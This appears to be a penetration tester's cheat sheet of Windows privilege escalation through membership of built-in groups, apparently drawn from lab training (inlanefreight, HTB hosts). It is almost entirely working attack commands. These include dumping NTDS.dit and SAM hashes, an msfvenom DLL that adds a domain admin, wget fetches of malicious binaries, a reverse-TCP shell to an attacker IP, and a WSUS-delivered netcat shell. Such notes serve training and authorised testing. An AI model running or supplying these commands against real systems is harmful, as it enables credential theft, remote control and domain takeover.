- [ ] Groups Enumeration
- [ ] Backup Operators
- [ ] Event Log Readers
- [ ] Dns Admins
- [ ] Hyper-V Administrators
- [ ] Print Operators
- [ ] Server Operators
- [ ] WSUS Administrators

Groups Enumeration!!!
```powershell
whoami /groups
```
Backup Operators!!!
![[Pasted image 20251029233335.png]]
```powershell
# netexec - fast
nxc smb <ip> -u username -p password -M backup_operator
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
# Verifying SeBackupPrivilege is Enabled
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv
# Copying a Protected File
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
# Attacking a Domain Controller - Copying NTDS.dit
### 1-diskshadow
diskshadow.exe 
DISKSHADOW> set verbose on 
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab DISKSHADOW> set context clientaccessible 
DISKSHADOW> set context persistent 
DISKSHADOW> begin backup 
DISKSHADOW> add volume C: alias cdrive 
DISKSHADOW> create DISKSHADOW> expose %cdrive% E: DISKSHADOW> end backup 
DISKSHADOW> exit
### 2-Copying NTDS.dit Locally
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
# Backing up SAM and SYSTEM Registry Hive
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
# Extracting Credentials from NTDS.dit
### 1-DSInternals
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
### 2-secretsdump.py
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
Event Log Readers!!!
```powershell
# netexec - fast
nxc smb <ip> -u username -p password -M eventlog_creds
# Event Log Readers Group
net localgroup "Event Log Readers"
# Query windows events from CLI (wevtutil and Get-WinEvent)
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
# requires administrator privileges
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
![[Pasted image 20251108210856.png]]
Dns Admins!!!
```powershell
# Generate Malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
# 1-Load DLL (NB: Use full path for the dll)
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
# Our permissions on the dns service
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
# Stop Start DNS service
sc stop dns
sc start dns
# NB:
By default, Membership in the DnsAdmins group do not give the ability to restart the DNS service...
RPWP : SERVICE_START and SERVICE_STOP, respectively.
# Cleaning Up
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
# 2-Abusing DNSAdmins Using Mimilib.dll
1. Edit kdns.c
2. dnscmd.exe /config /serverlevelplugindll \\IP\share
3. sc stop dns and sc start dns
# 3-Abusing DNSAdmins by Creating a WPAD Record
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address @attackerIP
```
Hyper-V Administrators!!!
```powershell
# Run to get full controll on the binary
hyperv-eop.ps1
# takeowner ship
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
# change the binary and restart the service
wget "http://IP/malicious" -outfile maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Print Operators!!!
![[Pasted image 20251029233246.png]]
```powershell
# UACME https://github.com/hfiref0x/UACME 
whoami /priv
# Capcom.sys vulnerable driver
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
# Verify Driver is not Loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
# EnableSeLoadDriverPrivilege | enable priv and load driver
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
.\EnableSeLoadDriverPrivilege.exe
# Verify Capcom Driver is Listed
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
# ExploitCapcom
.\ExploitCapcom.exe
# 1.Automate pre-steps
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
.\ExploitCapcom.exe
# 2.No GUI
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.97  LPORT=443 -f exe -o rev443.exe
.\noGUIExploitCapcom .exe
```
Server Operators!!!
![[Pasted image 20251029233210.png]]
```powershell
# check group membership
whoami /groups
whoami /priv
NB: we will abuse AppReadiness service
# confirm our rights on AppReadiness service
sc.exe qc AppReadiness
c:\Tools\PsService.exe security AppReadiness
sc.exe sdshow AppReadiness
# configure a malicious binpath
PsService.exe config spooler binpath= "\\10.10.14.97\share\rev443.exe"
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc config AppReadiness binPath= "\\10.10.14.97\share\rev443.exe"
# start appReadinedd service
sc start AppReadiness
PsService.exe start
```
WSUS Administrators!!!
```powershell
Get-ItemProperty HKLM:\software\policies\microsoft\windows\WindowsUpdate

.\SharpWSUS.exe locate
.\SharpWSUS.exe inspect
upload PsExec64.exe \temp\ps.exe

.\SharpWSUS.exe create /payload:"C:\temp\tempps.exe" /args:" -accepteula -s -d c:\temp\nc64.exe -e cmd.exe 10.10.16.23 443" /title:"CVE-2022-30190"

.\SharpWSUS.exe approve /updateid:09b0222b-d52f-47e6-b9c5-22b2af453d00 /computername:dc.outdated.htb /groupname:"CriticalPatches"

.\SharpWSUS.exe check /updateid:09b0222b-d52f-47e6-b9c5-22b2af453d00 /computername:dc.outdated.htb

NB:
WSUS only runs microsoft signed binarie -> this why we uses sysinternals PsExec64.exe ...  
```

References!!!
[SharpWSUS](https://www.lrqa.com/en/cyber-labs/introducing-sharpwsus/)